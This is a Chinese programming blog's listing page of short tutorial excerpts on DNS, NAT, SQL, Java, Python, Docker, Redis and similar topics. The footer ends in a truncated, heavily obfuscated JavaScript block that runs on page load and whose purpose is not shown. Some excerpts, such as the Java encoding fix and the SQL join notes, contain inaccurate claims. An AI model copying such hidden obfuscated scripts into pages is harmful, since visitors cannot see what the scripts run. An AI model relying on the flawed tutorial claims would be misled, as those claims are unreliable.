总的来说，基于麻雀算法优化BP神经网络的数据回归预测方法结合了麻雀算法的全局搜索能力和BP神经网络的非线性建模能力，可以提高数据回归预测任务的准确性和性能。
待处理数据：
代码效果图：
2.基于麻雀算法优化BP神经网络(SSA-BP)的数据分类以预测 SSA-BP（Sparrow Search Algorithm based BP Neural Network）是一种基于麻雀搜索算法优化BP神经网络的方法，用于数据分类预测。该算法结合了BP神经网络的学习能力和麻雀搜索算法的全局搜索能力，以提高分类预测的准确性和效率。
麻雀搜索算法是一种基于群体智能的优化算法，灵感来源于麻雀的群体行为。该算法模拟了麻雀群体的觅食过程，并通过个体的协作和信息传递来实现优化目标的搜索。
在SSA-BP中，BP神经网络作为分类器的基础模型。BP神经网络可以通过训练集的反向传播算法，来优化网络的权值和阈值，以实现对数据的分类预测。
然后，通过引入麻雀搜索算法来全局优化BP神经网络的参数。麻雀搜索算法通过模拟麻雀在觅食过程中的搜索行为，以全局性的方式搜索最优解。它利用一些启发式搜索策略，如随机搜索、局部搜索和全局搜索，以及信息传递和协作，不断调整BP神经网络的参数，以提高分类预测的准确性。
通过SSA-BP方法，可以在数据分类预测问题中获得更准确的预测结果。该方法充分利用了BP神经网络的学习能力和麻雀搜索算法的全局搜索能力，提高了分类器的效果。
处理的数据（Excel文件可直接替换，特征值可多可少）
代码效果图：
3.基于麻雀算法优化BP神经网络(SSA-BP)的数据时序预测 SSA-BP（Sparrow Search Algorithm based BP Neural Network）也可以应用于数据时序预测问题，以优化BP神经网络的性能。
在数据时序预测中，我们通常需要根据一系列历史数据的趋势和规律，来预测未来的数值或趋势变化。传统的BP神经网络在时序预测问题上表现一般，可能存在收敛速度慢、局部极值等问题。
为了提高BP神经网络在时序预测中的准确性和稳定性，可以使用SSA-BP方法。该方法首先利用BP神经网络对历史时序数据进行训练，通过反向传播算法来优化网络的权值和阈值。
然后，引入麻雀搜索算法来全局优化BP神经网络的参数。麻雀搜索算法通过模拟麻雀的觅食行为，以全局性的方式搜索最优解。它采用随机搜索、局部搜索和全局搜索等启发式策略，结合信息传递和协作，不断调整BP神经网络的参数，以提高时序预测的准确性。
通过SSA-BP方法，可以使得BP神经网络在时序预测问题上更加准确和稳定。这种组合方法充分利用了BP神经网络的学习能力和麻雀搜索算法的全局搜索能力，进一步提高了时序预测的准确性和效果。
待处理的数据集：（一列时序数据）
代码效果图：
获取代码请关注MATLAB科研小白的个人公众号（即文章下方二维码），公众号致力于解决找代码难，写代码怵。各位有什么急需的代码，欢迎后台留言~不定时更新科研技巧类推文，可以一起探讨科研，写作，文献，代码等诸多学术问题，我们一起进步。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b96802ac5ae27db0ac5da5563413687/" rel="bookmark">
			C&#43;&#43;异常捕获
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C++异常捕获 windows下使用_set_se_translator，linux下使用sjlj
main.cpp #include &lt;stdio.h&gt; // printf #include "myException.h" int main() { try { MY_EXCEPTION_CHECK // 0xc0000005 int *p = 0; *p = 1; // 0xc0000094 // int x=0; // int y=0; // volatile int z=x/y; } catch (const MyException &amp;e) { printf("myException %s\n", e.what()); } catch (...) { printf("exception...\n"); } } myException.h #ifndef _MY_EXCEPTION_H #define _MY_EXCEPTION_H #ifdef _WIN32 #include &lt;windows.h&gt; // EXCEPTION_POINTERS #include &lt;eh.h&gt; // _set_se_translator #else #include &lt;setjmp.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1b96802ac5ae27db0ac5da5563413687/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/47769a45be42aa8579ccc5d18f2375d9/" rel="bookmark">
			Windows操作系统 DNS服务器简介原理及搭建操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		DNS服务器简介： DNS（Domain Name System）服务器是互联网中负责将域名解析为 IP 地址的服务器，它的作用类似于电话簿中的记录。当用户在浏览器中输入一个域名时，浏览器将会向DNS服务器发出请求，以获取该域名对应的 IP 地址。DNS服务器通过查询域名的DNS记录，找到该域名对应的IP地址，并将其返回给浏览器。这个过程通常是自动进行的，用户通常无需注意和干预。DNS服务器也可以被部署在企业内部网络中，用于解析局域网内的主机名。
DNS服务器原理：
DNS就是域名系统，是因特网中的一项核心服务，是用于实现域名和IP地址相互映射的一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。通过主机名，得到该主机名对应的IP地址的过程叫做域名解析（或主机名解析）。
一、什么是DNS服务器？
承担将域名指向对应IP地址的服务器被称为DNS服务器。DNS服务器中保存了一张域名和与之相对应的IP地址的表，以解析消息的域名。由于互联网连通的是全球资源，单一的域名服务器不足以支撑全部的地址转换操作，因此全球有多套域名服务器相互配合使用。
三 、DNS服务器的分类
由于互联网中的域名采用层次树状结构的命名方法，因此与之对应的DNS服务器也采用层次树状结构。每一个DNS服务器都只对域名体系中的某一域进行管辖。根据DNS服务器所起的作用，可以分为以下几种类型：
（1）根域名服务器
根域名服务器是最高层次的域名服务器，它知道所有顶级服务器的域名和IP地址，当本地域名服务器无法对域名进行解析时，首先对根域名服务器发起请求。
（2）顶级域名服务器
顶级域名服务器负责管理该服务器下的所有二级域名，当收到DNS查询请求时，就会给权威域名服务器相应的回答。
（3）权威域名服务器
这就是前面所说的负责某一个区的域名服务器。当一个顶级域名服务器还不能给出最后查询回答时，就会告知下一步应当请求的权威域名服务器。
（4）本地域名服务器
本地域名服务器：当一个主机发出DNS查询请求时，这个查询请求报文就发送给本地域名服务器。每一个互联网服务提供者ISP都可以拥有一个本地域名服务器。当本地域名服务器无法给出应答时，就会请求最高级的根域名服务器。
搭建操作： 一、基础安装 打开服务器管理器-管理-添加角色和功能
选择基于角色或基于功能的安装
勾选DNS服务器
在弹出的框里，点击添加功能
一直点下一步，到下图后，不用勾选重启，直接点安装
二、配置DNS服务器 点击服务器管理器左边的【DNS】，选中服务器，右击，选择DNS管理器
在DNS管理器中，选择服务器，右击，选择配置DNS服务器
选择创建正向和反向查找区域
创建一个区域名称，自定
这里没有加域，所以选择不允许动态更新，如果加了域就选择允许安全的动态更新
重新打开DNS服务器，可以看到配置完成
选中一个区域，找到名称服务器，右击属性
在IP地址处，添加本机IP地址
最后应用即可
三、创建A记录，做测试 在一个区域内，空白地方，右击，选择新建主机A
添加成功
在一个服务器上，做测试，配置好刚才的DNS服务器地址
打开cmd，使用命令行，输入nslookup &lt;FQDN&gt;可以看到下面找到了IP
现在配置成功
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3f234ae83d400e59dc5581d6a1a16d04/" rel="bookmark">
			配置NAT和DHCP
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
NAPT原理
NAPT配置实例
静态NAT配置介绍
动态NAT
Easy-IP
DHCP配置命令介绍(1)
NAPT原理 动态NAT选择地址池中的地址进行地址转换时不会转换端口号，即NO-PAT (No-Port Address Translation，非端地址转换)，公有地址与私有地址还是1:1的映射关系，无法提高公有地址利用率。
NAPT (Network Address and Port Translation，网络地址端口转换): 从地址池中选择地址进行地址转换时不仅转换IP地址，同时也会对端口号进行转换，从而实现公有地址与私有地址的1:n映射，可以有效提高公有地址利用率。
NAPT配置实例 在R1上配置NAPT让内网所有私有地址通过122.1.2.1访问公网
[R1]nat address-group 1 122.1.2.1 122.1.2.1
[R1]acl 2000 R1-acl-basic-2000]rule 5 permit source 192.168.1.0 0.0.0.255
[R1-acl-basic-2000]quit R1linterface GigabitEthernet0/0/1
R1-GigabitEthernet0/0/1lnat outbound 2000 address-group i
静态NAT配置介绍 1.方式一:接口视图下配置静态NAT Huawei-GigabitEthernet0/0/0] nat static qlobal ( global-address inside fhost-address )global参数用于配置外部公有地址，inside参数用于配置内部私有地址。
2方式二:系统视图下配置静态NAT [Huawei] nat static global i global-address) inside fhost-address 配置命令相同，视图为系统视图，之后在具体的接口下开启静态NAT。Huawei-GigabitEthernet0/0/0] nat static enable在接口下使能nat static功能。
动态NAT 1 nat address-group 1 200.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3f234ae83d400e59dc5581d6a1a16d04/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0b88106af6c07b67834746d9380f53e9/" rel="bookmark">
			python关于当前时间戳的获取及时间运算
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		日期和时间在计算机编程中是非常重要的概念，特别是在处理数据、日志记录、计划任务等方面。Python作为一门功能强大的编程语言，提供了丰富的库和内置函数，使得对日期和时间的操作变得简单而高效。本文将介绍一些常见的Python日期时间操作，以帮助你更好地处理和管理时间数据，本文将介绍python关于当前时间戳的获取及时间的运算、转换相关内容。
处理时间和日期主要使用datetime模块。该模块包含了一些类和函数，使得可以轻松地获取当前日期和时间，以及进行各种算术运算。下面是一些与时间有关的常用类：
- date：表示一个日期，比如年、月、日。
- time：表示一个时间，比如小时、分钟、秒等。
- datetime：表示一个日期和时间组合。
（strftime()可以将datetime转换为字符串，strptime()可以将字符串转换为datetime）
时间的运算：加减 方法一：timedelta 什么是timedelta呢？它表示一个时间长度，可以是两个星期相减的差值，也可以是两个日期相减的差值等等，两个datetime.datetime相减或者两个datetime.date相减的结果就是daftetime.delta
例：
import datetime start_time = datetime.datetime(2023, 10, 24, 15, 30, 0) delta = datetime.timedelta(days=1) end_time = start_time + delta print(end_time) 输出：
2023-10-25 15:30:00 释义：开始时间+delta时间 [1天间隔] =后一天的时间 同理如果是-1则可求出前一天的时间
方法二：使用datetime直接相减 例：
import datetime start_time = datetime.datetime(2022, 11, 5, 15, 30, 0) end_time = datetime.datetime(2022, 11, 10, 12, 0, 0) time_delta = end_time - start_time print(time_delta) 输出：
4 days, 20:30:00 释义：可直接得出相差的时间 方法三：使用mktime（时间戳） 首先说一说什么是时间戳，时间戳即1970年1月1日以来经过的秒数。可以使用如下方式求出两个日期之间的时间差。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0b88106af6c07b67834746d9380f53e9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/00ae51dde147cc0bcb136b74f131b62b/" rel="bookmark">
			（个人笔记质量不佳）SQL 左连接、右连接、内连接的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		左连接 取左表的全部数据，将右表的符合要求的数据拼接在左表上。 二者条件为ON
假设：左表有两行两列数据，右表也有两行两列数据，二者符合on要求的数据都为空，则二者左连接后的数据集为：
左表行1+null
左表行2+null
内连接 取左表的全部数据，再取右表的全部数据，判断ON条件，左、右边两张表的数据都要有，且符合ON条件的，才拼接显示。
举例：左表有两行两列数据，右表符合on要求的数据为空，则二者内连接后的数据集为：
null
是的，全为空。
右连接 左连接 取右表的全部数据，将左表的符合要求的数据拼接在右表上。 二者条件为ON
假设：左表有两行两列数据，右表也有两行两列数据，二者符合on要求的数据都为空，则二者左连接后的数据集为：
null+右表行1
null+右表行2
内连接和左连接的区别 内连接和左连接相比只有两个要点：
1.on条件要满足
2.左右两张表都不为空
因此，在左连接后，加个where xx is not null 呈现效果和内连接是一样的，这样也能排除重复数据。
当然，这是在不考虑执行效率的情况下的操作。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1ce182241bf3b75e6445999516d4fb0e/" rel="bookmark">
			ijkplayer的seek过程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		IjkVideoView.java
seekTo(seekToPosition); ijkplayer_jni.c
{ "seekTo", "(J)V", (void *) IjkMediaPlayer_seekTo }, int ijkmp_seek_to_l(IjkMediaPlayer *mp, long msec) ffp_notify_msg2(mp-&gt;ffplayer, FFP_REQ_SEEK, (int)msec); case FFP_REQ_SEEK: MPTRACE("ijkmp_get_msg: FFP_REQ_SEEK\n"); continue_wait_next_msg = 1; pthread_mutex_lock(&amp;mp-&gt;mutex); if (0 == ikjmp_chkst_seek_l(mp-&gt;mp_state)) { mp-&gt;restart_from_beginning = 0; if (0 == ffp_seek_to_l(mp-&gt;ffplayer, msg-&gt;arg1)) { av_log(mp-&gt;ffplayer, AV_LOG_DEBUG, "ijkmp_get_msg: FFP_REQ_SEEK: seek to %d\n", (int)msg-&gt;arg1); } } pthread_mutex_unlock(&amp;mp-&gt;mutex); break; ffp_seek_to_l(FFPlayer *ffp, long msec) stream_seek(is, seek_pos, 0, 0); static void stream_seek(VideoState *is, int64_t pos, int64_t rel, int seek_by_bytes) { if (!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1ce182241bf3b75e6445999516d4fb0e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4d98261b01e700a3759f7f1e17414449/" rel="bookmark">
			java字符串拼接出现乱码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java中的字符串拼接不会出现乱码。乱码通常是由于字符编码的问题引起的。
在Java中，字符串使用Unicode编码表示，它支持所有的字符，包括中文等非ASCII字符。因此，对于常见的字符编码，字符串拼接不会引起乱码。例如，下面的代码片段不会出现乱码：
String s1 = "Hello"; String s2 = "World"; String result = s1 + s2; System.out.println(result); 然而，当涉及到其他字符编码时，就有可能出现乱码的情况。例如，当使用UTF-8编码的字符串与使用ISO-8859-1编码的字符串拼接时，就可能出现乱码。这是因为UTF-8和ISO-8859-1编码方式不同，导致它们解码出来的字符不一致。
如果在字符串拼接过程中出现了乱码，可以通过指定相同的字符编码方式解决问题，或者将字符串先转换为相同的编码再进行拼接。例如：
String s1 = "Hello"; String s2 = "中国"; byte[] bytes = s2.getBytes("UTF-8"); s2 = new String(bytes, "UTF-8"); String result = s1 + s2; System.out.println(result); 上述代码将字符串s2从UTF-8转换为UTF-8编码后再进行拼接，可以避免乱码的情况。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dd09bf6f3c6f50ea87cba2d59de3e4dd/" rel="bookmark">
			Java线程的并发工具类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java线程的并发工具类。
一、fork/join 1. Fork-Join原理 在必要的情况下，将一个大任务，拆分（fork）成若干个小任务，然后再将一个个小任务的结果进行汇总（join）。
适用场景：大数据量统计类任务。
2. 工作窃取 Fork/Join在实现上，大任务拆分出来的小任务会被分发到不同的队列里面，每一个队列都会用一个线程来消费，这是为了获取任务时的多线程竞争，但是某些线程会提前消费完自己的队列。而有些线程没有及时消费完队列，这个时候，完成了任务的线程就会去窃取那些没有消费完成的线程的任务队列，为了减少线程竞争，Fork/Join使用双端队列来存取小任务，分配给这个队列的线程会一直从头取得一个任务然后执行，而窃取线程总是从队列的尾端拉取task。
3. 代码实现 我们要使用 ForkJoin 框架，必须首先创建一个 ForkJoin 任务。它提供在任务中执行 fork 和 join 的操作机制，通常我们不直接继承 ForkjoinTask 类，只需要直接继承其子类。
1、RecursiveAction，用于没有返回结果的任务。
2、RecursiveTask，用于有返回值的任务。
task 要通过 ForkJoinPool 来执行，使用 invoke、execute、submit提交，两者的区别是：invoke 是同步执行，调用之后需要等待任务完成，才能执行后面的代码；execute、submit 是异步执行。
示例1：长度400万的随机数组求和，使用RecursiveTask 。
/** * 随机产生ARRAY_LENGTH长的的随机数组 */ public class MakeArray { // 数组长度 public static final int ARRAY_LENGTH = 4000000; public static int[] makeArray() { // new一个随机数发生器 Random r = new Random(); int[] result = new int[ARRAY_LENGTH]; for (int i = 0; i &lt; ARRAY_LENGTH; i++) { // 用随机数填充数组 result[i] = r.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dd09bf6f3c6f50ea87cba2d59de3e4dd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a5e9af9f0527dbab016e474c4863fe97/" rel="bookmark">
			C#之网络
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		网络是什么？
​ 从远程服务器上获取数据
​ 把本地数据上传到服务器上
在网络环境中，我们最感兴趣的两个名称空间是System.Net和System.Net.Sockets。
System.Net名称空间通常与较高层的操作有关，例如下载和上传文件，使用HTTP和其他协议进行Web请求等；
而System.Net.Sockets名称空间包含的类通常与较低层的操作有关。如果要直接使用套接字或TCP/IP之类的协议，这个名称空间中的类就非常有用。
System.Net命名空间 System.Net命名空间为当前网络上使用的多种协议提供了简单的编程接口，而它所包含的WebRequest类和WebResponse类形成了所谓的可插接式协议的基础。
可插接式协议是网络服务的一种实现，它使用户能够开发出使用Internet资源的应用程序,而不必考虑各种不同协议的具体细节。
Dns类 Dns类是一个静态类，它从Internet域名系统(Dns)检索关于特定主机的信息。在IPHostEntry类的实例中返回来自DNS查询的主机信息。如果指定的主机在DNS数据库中有多个入口，则IPHostEntry包含多个IP地址和别名。
方法说明BeginGetHostAddresses异步返回指定主机的Internet协议（IP）地址BeginGetHostByName开始异步请求关于指定DNS主机名的IPHostEntry信息EndGetHostAddresses结束对DNS信息的异步请求EndGetHostByName结束对DNS信息的异步请求EndGetHostEntry结束对DNS信息的异步请求GetHostAddresses返回指定主机的Internet协议（IP）地址GetHostByAddresses获取IP地址的DNS主机信息GetHostByName获取指定DNS主机名的DNS信息GetHostEntry将主机名或IP地址解析为IPHostEntry实例GetHostName获取本地计算机的主机名 在Form窗体中添加4个TextBox控件和一个Button控件。TextBox控件分别用来输入主机地址和显示主机IP地址、本地主机名、DNS主机名。
private void button_Click(object sender, EventArgs e) { //判断是否输入了主机地址 if(TextBox1.Text == string.Empty) { MessageBox.Show("请输入主机地址"); } else { textBox2.Text = string.Empty; //获取指定主机的IP地址 IPAddress[] ips = Dns.GetHostAddresses(textBox1.Text); foreach(IPAddress ip in ips) { textBox2.Text = ip.ToString(); } //获取本机名 textBox3.Text = Dns.GetHostName(); //根据指定的主机名获取DNS信息 textBox4.Text = Dns.GetHostByName(Dns.GetHostName()).HostName; } } IPAddress类 IPAddress类包含计算机在Ip网络上的地址，它主要用来提供网际协议（IP）地址。
字段、属性及方法说明Any字段提供一个IP地址，指示服务器应侦听所有网络接口上的客户端活动。该字段为只读。Broadcast字段提供IP广播地址。该字段为只读。Loopback字段提供IP环回地址。该字段为只读。None字段提供指示不应使用任何网络接口的IP地址。该字段为只读。Address属性网际协议（IP）地址AddressFamily属性获取IP地址的地址族IsIPv6LinkLocal属性获取地址是否IPv6链接本地地址IsIPv6Multicast属性获取地址是否为IPv6多路广播全局地址IsIPv6SiteLocal属性获取地址是否为IPv6站点本地地址ScopeId属性获取或设置IPv6地址范围标识符GetAddressBytes方法以字节数组形式提供IPAddress的副本IsLoopback方法指示指定的IP地址是否是环回地址Parse方法将IP地址字符串转换为IPAddress实例TryParse方法确定字符串是否为有效的IP地址 IPEndPoint类 IPEndPoint类包含应用程序连接到主机上的服务所需的主机和本地或远程端口信息。通过组合服务的主机IP地址和端口号，IPEndPoint类形成到服务器的连接点，它主要用来将网络端点表示为IP地址和端口号。
字段即属性说明MaxPort字段指定可以分配给port属性的最大值。Maxport值设置为0x0000FFFF。该字段为只读。MinPort字段可以分配给指定port属性的最小值。该字段为只读。Address属性获取或设置终结点的IP地址AddressFamily属性获取网际协议（IP）地址族Port属性获取或设置终结点的端口号 WebClient类 WebClient类提供向URI标识的任何本地、Intranet或Internet资源发送数据以及从这些资源接收数据的公共方法。
属性及方法说明BaseAddress属性获取或设置WebClient发出请求的基URIEncoding属性获取或设置用于上传和下载字符串的EncodingHeaders属性获取或设置与请求关联的报头名称/值对集合QueryString属性获取或设置与请求关联的查询名称/值对集合ResponseHesders获取与响应关联的报头名称/值对集合DownloadData方法以Byte数组形成通过指定的URI下载DownloadFile方法将具有指定URI的资源下载到本地文件DownloadString方法以String或URI形式下载指定的资源OpenRead方法为从具有指定URI的资源下载的数据打开一个可读的流OpenWrite方法打开一个流，以将数据写入具有制定URI的资源UploadData方法将数据缓冲区上传到具有指定URI的资源UploadFile方法将本地文件上传到具有指定URI的资源UploadString方法将指定的字符串上传到指定的资源UploadValues方法将名称/值集合上传到具有指定URI的资源 System.Net.Sockets命名空间 TcpClient类和TcpListener类 TcpClient类用于在同步阻止模式下通过网络连接、发送和接受流数据。为使TcpClient连接并交换数据，使用TcpProtocolType类创建的TcpListener实例或Socket实例必须侦听是否有传入的连接请求。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a5e9af9f0527dbab016e474c4863fe97/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/415bbcd857dcd5843ba2a650861b2050/" rel="bookmark">
			使用Dockerfile构建Docker镜像
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、Dockerfile是什么？二、制作步骤1.准备一个可以运行的项目2.构建镜像2.启动镜像 总结 前言 我们都知道运行一个已经编写完成的程序是需要各种各样的环境的,但是环境配置是十分的麻烦，每一个及其都要部署环境(集群Redis、ES、Hadoop…) ，费事费力。但是Docker可以帮助我们解决这个问题，打包镜像发布测试一键运行，省去我们很多不必要的麻烦，本篇就介绍如何使用Dockerfile生成镜像运行我们的项目。
一、Dockerfile是什么？ Dockerfile使用来构建Docker镜像的文本文件，是由一条条构建镜像所需的指令和参数构成的脚本。
二、制作步骤 1.准备一个可以运行的项目 我这里是一个可以运行的python项目并且已经上传到linux 服务上面,进入到文件夹可以看到我编写的Dockerfile文件
Dockerfile文件内容仅供参考
FROM python:3.8-slim-buster WORKDIR /app COPY requirements.txt requirements.txt RUN apt update RUN apt-get install -y libsm6 libxext6 libxrender-dev libglib2.0-0 libgl1 RUN pip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple/ COPY . . CMD ["python", "app_api.py"] 如果你是java项目可以参考
FROM eclipse-temurin:8-jre ## 创建目录，并使用它作为工作目录 RUN mkdir -p /skb-server WORKDIR /skb-server ## 将后端项目的 Jar 文件，复制到镜像中 COPY /skb-server/target/skb-server.jar skb-server.jar ## 设置 TZ 时区 ENV TZ=Asia/Shanghai ## 设置 JAVA_OPTS 环境变量，可通过 docker run -e "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/415bbcd857dcd5843ba2a650861b2050/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bb43775d562cbe511eec3c896cb57f4b/" rel="bookmark">
			Oracle 中 group by 的使用需要注意的地方
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言：这只是示例，方法并不适用业务场景！
1.业务场景 需要将2023年1-12月的数据全部查出，并以行的形式呈现。这里要用到行转列的思路，我采用的是简单的case when函数。
2.group by 的使用方法 WHERE xxx1='xx' AND xxx2='yy' group by (除聚合函数以外的所有字段) 举个例子：
select studentName,studentId,avg(score) FROM Student WHERE studentName like '王%' GROUP BY studentName,studentId #分组的字段只采用非聚合函数的字段，avg()是聚合函数，故不对其分组 /** 使用了聚合函数后，要分组的原理。 逆向思维：若不用分组，则avg(score)将，score这一列的所有数据全部求平均数后只能得到单列单行的平均分， 有n个学生，却只有一个平均分，该分给谁？分给谁都不对！ 因此，在使用聚合函数之后，再使用分组，SQL在执行时，会先对数据表按字段进行分组，然后再求平均分，那么，分组后的每一组都有各自的平均分。如此，逻辑合理。 **/ 3.group by 与case when结合 select studentName, studentId, CASE WHEN studentName like '王%' THEN age END AS case1 ,avg(score) FROM Student GROUP BY studentName, studentId, CASE WHEN studentName like '王%' THEN age END	-- ‘case when’ 只是普通的条件函数，非聚合函数，因此在分组时也要加上该字段，不然会报错！ 若不加case when条件进行分组，则报错如下信息：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bb43775d562cbe511eec3c896cb57f4b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/672a34475c28d191612213e674ea1edc/" rel="bookmark">
			x86与x64简述
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 参考：
https://www.php.cn/faq/556228.html
https://baijiahao.baidu.com/s?id=1780254509175249371&amp;wfr=spider&amp;for=pc
https://www.runoob.com/linux/linux-comm-uname.html
1. x86和x64 1.1 x86和x64简述 x86和x64都属于处理器平台的系统架构术语。值得注意的是，因为x64架构是由x86架构扩展而来，所以有时x64也被称为x86_64。
简单来说，x86是32位的CPU，x64是64位的CPU。
1.2 x86和x64的区别 2者的主要区别有以下几个方面，
1、指令集架构不同，x86基于32位指令集，而x64基于64位指令集；
2、内存地址空间不同，由于x86 一次性可处理32的数据，而x64一次性可处理64位的数据，由此导致了2者在内存寻址空间上的差异。CPU最大只能处理4GB的内存，而x64 CPU可以访问更大的内存空间；
3、软件兼容性差异，大部分基于x86架构的软件在x64上可以正常运行，但是少数需要与硬件相关联的应用程序可能无法在x64上运行或需要专门的补丁来支持；
4、驱动程序兼容性差，旧的硬件设备可能只有针对x86系统的驱动程序，导致x64无法使用；
2. 查看linux系统cpu的架构 2.1 uname命令 uname [-amnrsv][--help][--version] 参数说明：
-a 或–all 显示全部的信息，包括内核名称、主机名、操作系统版本、处理器类型和硬件架构等。。
-m 或–machine 显示处理器类型。
-n 或–nodename 显示主机名。
-r 或–release 显示内核版本号。
-s 或–sysname 显示操作系统名称。
-v 显示操作系统的版本。
–help 显示帮助。
–version 显示版本信息。
-p 显示处理器类型（与 -m 选项相同）。
2.2 查看linux系统cpu的架构 可以使用uname命令查看linux系统cpu的架构。
# 如x86_64 表示linux为64位系统 uname -m 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/43d83203753a4c68ca9499134e68d2b8/" rel="bookmark">
			redis持久化之AOF（Append Only File）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 : AOF 是什么 以日志的形式来记录每个写操作（增量保存），将redis执行过的所有写指令记录下来（读操作不记 录），只允追加文件但不可改写文件，redis启动之初会读取该文件重新构造数据，换言之，redis重启
的话就根据日志文件的内容将写指令从前到后执行一次以完成数据的恢复工作。
2 : AOF持久化流程 1. 客户端的请求写命令会被append追加到AOF缓冲区内
2. AOF缓冲区会根据AOF持久化策略[always,everysec,no]将操作sync同步到磁盘的AOF文件中
3. AOF文件大小超过重写策略或手动重写时，会对AOF文件进行重写（rewrite），压缩AOF文件容量
4. redis服务器重启时，会重新load加载AOF文件中的写操作达到数据恢复的目的
3 : AOF默认不开启 可以在 redis.conf 文件中对AOF进行配置
1. appendonly no # 是否开启AOF，yes：开启，no：不开启，默认为no
2. appendfilename “appendonly.aof” # aof文件名称，默认为appendonly.aof
3. dir ./ # aof文件所在目录，默认./，表示执行启动命令时所在的目录，比如我们在/opt目录中，去执行
4. redis-server /etc/redis.conf 来启动redis，那么dir此时就是/opt目录
4 : 、AOF和RDB同时开启，redis听谁的？ AOF和RDB同时开启，系统默认取AOF的数据（数据不会存在丢失）
5 : AOF启动/修复/恢复 AOF的备份机制和性能虽然和RDB不同，但是备份和恢复的操作同RDB一样，都是拷贝备份文件， 需要恢复时再拷贝到Redis工作目录下，启动系统即加载
正常恢复 1. 修改默认的appendonly no，改为yes
2. 将有数据的aof文件复制一份保存到对应的目录（查看目录：config get dir）
3. 恢复：重启redis然后重新加载
异常恢复 1. 修改默认的appendonly no，改为yes
2. 如遇到aof文件损坏，通过 /usr/local/bin/redis-check-aof --fix appendonly.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/43d83203753a4c68ca9499134e68d2b8/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/71/">«</a>
	<span class="pagination__item pagination__item--current">72/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/73/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var 